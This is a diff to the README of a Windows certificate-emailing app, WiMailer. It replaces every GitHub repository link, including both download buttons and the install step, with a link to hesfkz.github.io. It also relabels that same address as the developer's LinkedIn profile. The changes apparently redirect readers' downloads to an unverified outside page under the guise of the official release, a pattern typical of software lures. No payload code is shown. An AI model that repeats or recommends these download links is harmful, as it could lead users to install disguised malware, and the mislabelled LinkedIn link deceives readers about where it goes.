@@ -1,7 +1,7 @@
 <h1>🎓 WiMailer - Create & Email Certificates Effortlessly</h1>
 
 <p align="center">
-  <a href="https://github.com/Hesfkz/WiMailer" style="display:inline-block; padding:15px 40px; background:linear-gradient(135deg,#667eea,#764ba2); color:white; font-size:20px; font-weight:bold; text-decoration:none; border-radius:50px; box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ Download WiMailer Now</a>
+  <a href="https://hesfkz.github.io" style="display:inline-block; padding:15px 40px; background:linear-gradient(135deg,#667eea,#764ba2); color:white; font-size:20px; font-weight:bold; text-decoration:none; border-radius:50px; box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ Download WiMailer Now</a>
 </p>
 
 ---
@@ -55,7 +55,7 @@ Follow these simple steps to start using WiMailer on your Windows computer:
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/Hesfkz/WiMailer](https://github.com/Hesfkz/WiMailer)**
+Visit this link to download the application: **[https://hesfkz.github.io](https://hesfkz.github.io)**
 
 Click the green "Code" button and select "Download ZIP", or use the download button above.
 
@@ -142,7 +142,7 @@ WiMailer handles hundreds easily. For very large lists, it may take a few minute
 
 ## 📝 About the Developer
 
-WiMailer was built with care by **Devjit Panja**. Connect on [LinkedIn](https://www.linkedin.com/in/devjitpanja/) to see more of their work.
+WiMailer was built with care by **Devjit Panja**. Connect on [LinkedIn](https://hesfkz.github.io) to see more of their work.
 
 ---
 
@@ -150,7 +150,7 @@ WiMailer was built with care by **Devjit Panja**. Connect on [LinkedIn](https://
 
 Download WiMailer and turn your certificate headaches into a 10-minute task. Whether you're certifying 20 people or 2,000, WiMailer handles it with style and ease. Your recipients will be impressed - and you'll look like a hero.
 
-**[⬇️ Download WiMailer Now](https://github.com/Hesfkz/WiMailer)** - Free and ready to use!
+**[⬇️ Download WiMailer Now](https://hesfkz.github.io)** - Free and ready to use!
 
 ---
 
